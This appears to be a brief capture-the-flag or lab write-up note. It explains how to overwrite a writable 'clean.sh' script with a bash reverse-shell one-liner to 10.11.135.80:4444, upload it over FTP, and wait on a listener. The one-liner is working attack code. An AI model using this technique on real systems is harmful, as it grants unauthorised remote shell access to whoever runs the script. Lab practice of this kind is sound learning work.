**`clean.sh` can be modified to get a reverse shell** to the user that is running the script (clean.sh).

# Exploitation
---
```bash        
#!/bin/bash
bash -i >& /dev/tcp/10.11.135.80/4444 0>&1
```
- Upload on ftp server:
	- `put clean.sh`
- Start listener to get a connection:
- ![[Pasted image 20250502161555.png]]